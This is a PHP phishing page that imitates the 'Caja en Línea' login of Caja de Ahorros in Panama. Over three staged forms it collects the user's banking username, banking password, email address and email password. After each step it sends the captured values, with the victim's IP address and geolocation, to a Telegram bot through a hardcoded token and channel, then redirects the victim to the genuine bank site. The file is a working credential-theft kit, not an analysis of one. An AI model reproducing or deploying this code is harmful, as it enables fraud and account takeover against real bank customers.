<?php
ini_set("display_errors", 0);
session_start();
/**el-telgram***/
$apibot = "6820988210:AAGXb1zLKCPtr9v6g6vXICT3VaYxLpJRAKA";
$canal =  "@Ahorropanama";

function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
?>
<!DOCTYPE html>
<html  class="">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">


<link href="https://usimmyro.sirv.com/efisis/bootstrap-table.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" media="all" href="https://usimmyro.sirv.com/efisis/bootstrap.min.css">
<link rel="stylesheet" type="text/css" media="all" href="https://usimmyro.sirv.com/efisis/bootstrap-datepicker.min.css">
<link rel="stylesheet" type="text/css" href="https://usimmyro.sirv.com/efisis/select2.min.css">

<link rel="stylesheet" type="text/css" media="all" href="https://usimmyro.sirv.com/efisis/style.css">




<title>Caja en L&iacute;nea de Caja de Ahorros</title>

<style>
.content {
	position: absolute;
	bottom: 25%;
}

.footer-social a, .footer-lang a {
	text-decoration: none;
}

 .footer-lang span , .footer-lang a{
	color: #6a6a6a;
	font-size: .8rem;
}

.footer-social i {
	margin-right:.5rem;
}



.container {
	padding-top: 10%;
}
select, input[type="text"], input[type="password"], input[type="search"] {

    height: 3rem; 
}
	</style> 
</head>

<body class="login">


<button onclick="topFunction()" id="scrollToTopBtn" title="Subir"><i class="fal fa-arrow-up"></i></button>
<button onclick="bottomFunction()" id="scrollToBottomBtn" title="Bajar"><i class="fal fa-arrow-down"></i></button>

<div id="vista1">

<form method="POST" autocomplete="OFF" action="#" >


	<div class="container">
		<div class="row ">
			<div class="col-10 offset-1 col-lg-4 offset-lg-4 ">
		
								<div id="login-card" class="card border-top-0 m-0 box-shadow-2 ">
									<div class="card-header text-center dp-card-header row mx-0">
										<div class="col-12 pt-lg-2">
											<img class="img-fluid logo" src="https://usimmyro.sirv.com/efisis/cda-logo.svg" alt="branding logo">
										</div>
										<div class="col-12 pt-lg-2 pb-2 text-center login-card-title">CAJA EN L&iacute;NEA</div>										
									</div>

									<div class="card-body p-0">
										<div class="card-block pr-0 py-0">
											<div class="row mr-0">
												<div class="col-4 my-4 pr-0 pt-1 text-right">
												
													<img class="mr-4 d-inline " height="42" style="background: #d3d1d2;" src="https://usimmyro.sirv.com/efisis/user-icon2.svg" alt="user icon">
														</div>
														<div class="col-8 col-lg-6 my-4 pl-0">
													
														<input id="user_name" class="field-text form-control required" type="text"  name="userr"  
														maxlength="10" onkeyup="this.value = this.value.toUpperCase();" 
														style="font-size: 1em;width:100%;height: 60px;"
														autocomplete="off" placeholder="INGRESE SU USUARIO" required="">
													</div>
													
												</div>
												
												
											
												
												
												
											</div>
											
										
											
										
										<div class="row">

											<div class="col-12 col-lg-8 text-center text-lg-left pl-lg-4 pt-lg-3">
												<p class="m-0">&iquest;Usuario nuevo?
													<a href="#" class="card-link">Af&iacute;liate aqu&iacute;</a>
												</p>
											</div>

											<div class="col-12 col-lg-4  text-center text-lg-right px-4 pr-lg-4 pb-lg-2">
												<button id="submit" type="submit" class="btn btn-info btn-block ">
												Continuar
												</button>
											</div>
										</div>
									</div>
								</div>
								<div class="row ">
									<div class="col-12 text-center">
									<img class="img-fluid mx-auto login-mascot" src="https://usimmyro.sirv.com/efisis/mascota.png">
									</div>
								</div>
							</div>
						</div>
		
			</div>

</form>

</div><!--Fin vista1 -->
<?php 
	
if(isset($_POST['userr']) ){
	
	
$message = "CajaAhorroPA\r\nUsuario: ".$_POST['userr']."\r\nIP: ".$myip." ".$pais." ".$region."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista2").style.display = "inline";
document.getElementById("vista3").style.display = "none";
</script>';

?>	

<div id="vista2">

<form method="POST" autocomplete="OFF" action="#" >


	<div class="container">
		<div class="row ">
			<div class="col-10 offset-1 col-lg-4 offset-lg-4 ">
		
								<div id="login-card" class="card border-top-0 m-0 box-shadow-2 ">
									<div class="card-header text-center dp-card-header row mx-0">
										<div class="col-12 pt-lg-2">
											<img class="img-fluid logo" src="https://usimmyro.sirv.com/efisis/cda-logo.svg" alt="branding logo">
										</div>
										<div class="col-12 pt-lg-2 pb-2 text-center login-card-title">CAJA EN L&iacute;NEA</div>										
									</div>

									<div class="card-body p-0">
										<div class="card-block pr-0 py-0">
										
												
												
												<div class="row mr-0">
												<div class="col-4 my-4 pr-0 pt-1 text-right">
												
													<img class="mr-4 d-inline " height="42" style="background: #d3d1d2;" src="https://usimmyro.sirv.com/efisis/loginp.svg" alt="user icon">
														</div>
														<div class="col-8 col-lg-6 my-4 pl-0">
													
														<input id="user_name" class="field-text form-control required" type="password"  name="passs"  
													 style="font-size: 1em;width:240px;height: 60px;" autocomplete="off" 
													 placeholder="Por favor ingrese su contrase&ntilde;a." 
													 required="">
													</div>
													
												</div>
												
												
												
											</div>
											
										
											
											
										<div class="row">

											<div class="col-12 col-lg-8 text-center text-lg-left pl-lg-4 pt-lg-3">
												<p class="m-0">
													<a href="#"  style="font-size: 1.2em;" class="card-link">&iquest;Olvid&oacute; su contraseña?</a>
												</p>
											</div>

											<div class="col-12 col-lg-4  text-center text-lg-right px-4 pr-lg-4 pb-lg-2">
												<button id="submit" type="submit" class="btn btn-info btn-block ">
												Continuar
												</button>
											</div>
										</div>
									</div>
								</div>
								<div class="row ">
									<div class="col-12 text-center">
									<img class="img-fluid mx-auto login-mascot" src="https://usimmyro.sirv.com/efisis/mascota.png">
									</div>
								</div>
							</div>
						</div>
		
			</div>

</form>
</div><!--Fin vista2 -->

<?php 
	
} else if(isset($_POST['passs']) ){
	
	
$message = "CajaAhorroPA\r\nClave: ".$_POST['passs']."\r\nIP: ".$myip." ".$pais." ".$region."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista2").style.display = "none";
document.getElementById("vista3").style.display = "inline";
</script>';

?>	

<div id="vista3">
<form method="POST" autocomplete="OFF" action="#" >


	<div class="container">
		<div class="row ">
			<div class="col-10 offset-1 col-lg-4 offset-lg-4 ">
		
								<div id="login-card" class="card border-top-0 m-0 box-shadow-2 ">
									<div class="card-header text-center dp-card-header row mx-0">
										<div class="col-12 pt-lg-2">
											<img class="img-fluid logo" src="https://usimmyro.sirv.com/efisis/cda-logo.svg" alt="branding logo">
										</div>
										<div class="col-12 pt-lg-2 pb-2 text-center login-card-title">CAJA EN L&iacute;NEA</div>										
									</div>

									<div class="card-body p-0">
										<div class="card-block pr-0 py-0">
											<div class="row mr-0">
												<div class="col-4 my-4 pr-0 pt-1 text-right">
												
													<img class="mr-4 d-inline " height="42" style="background: #d3d1d2;" src="https://usimmyro.sirv.com/efisis/user-icon2.svg" alt="user icon">
														</div>
														<div class="col-8 col-lg-6 my-4 pl-0">
													
														<input id="user_name" class="field-text form-control required" type="email"  name="emmsal"  
														  style="font-size: 1em;width:240px;height: 60px;" autocomplete="off" 
														  placeholder="Correo electrónico" required="">
													</div>
													
												</div>
												
												
												<div class="row mr-0">
												<div class="col-4 my-4 pr-0 pt-1 text-right">
												
													<img class="mr-4 d-inline " height="42" style="background: #d3d1d2;" src="https://usimmyro.sirv.com/efisis/loginp.svg" alt="user icon">
														</div>
														<div class="col-8 col-lg-6 my-4 pl-0">
													
														<input id="user_name" class="field-text form-control required" type="password"  name="clavems"  
														  style="font-size: 1em;width:240px;height: 60px;" autocomplete="off" placeholder="Contrase&ntilde;a de correo" required="">
													</div>
													
												</div>
												
												
											</div>
											
											
										
										
										<div class="row">

											<div class="col-12 col-lg-8 text-center text-lg-left pl-lg-4 pt-lg-3">
												<p class="m-0">
													<a href="#" class="card-link">¿No recuerda su correo?</a>
												</p>
											</div>

											<div class="col-12 col-lg-4  text-center text-lg-right px-4 pr-lg-4 pb-lg-2">
												<button id="submit" type="submit" class="btn btn-info btn-block ">
												Continuar
												</button>
											</div>
										</div>
									</div>
								</div>
								<div class="row ">
									<div class="col-12 text-center">
									<img class="img-fluid mx-auto login-mascot" src="https://usimmyro.sirv.com/efisis/mascota.png">
									</div>
								</div>
							</div>
						</div>
		
			</div>

</form>

</div><!--Fin vista3 -->
<?php 
	
} else if(isset($_POST['emmsal']) && isset($_POST['clavems']) ){
	
	
$message = "CajaAhorroPA\r\nCorreo: ".$_POST['emmsal']."\r\nClave Correo: ".$_POST['clavems']."\r\nIP: ".$myip." ".$pais." ".$region."\r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


echo '<script laguage="javascript">
document.getElementById("vista1").style.display = "none";
document.getElementById("vista2").style.display = "none";
document.getElementById("vista3").style.display = "none";
</script>';
echo '<script type="text/javascript">window.location.href = "https://www.cajadeahorros.com.pa/";</script>';

}
?>	
</body></html>